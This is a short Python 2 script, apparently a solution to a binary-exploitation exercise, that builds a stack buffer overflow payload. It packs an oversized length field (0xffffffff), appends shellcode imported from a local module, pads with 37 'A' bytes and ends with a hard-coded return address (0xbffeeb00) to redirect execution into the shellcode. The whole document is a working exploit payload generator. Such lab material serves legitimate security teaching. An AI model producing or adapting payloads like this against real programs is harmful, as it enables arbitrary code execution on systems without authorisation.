from shellcode import shellcode
from struct import pack

length = pack("<I", 0xffffffff)
sh_addr = pack("<I", 0xbffeeb00)

print length + shellcode + 'A' * 37 + sh_addr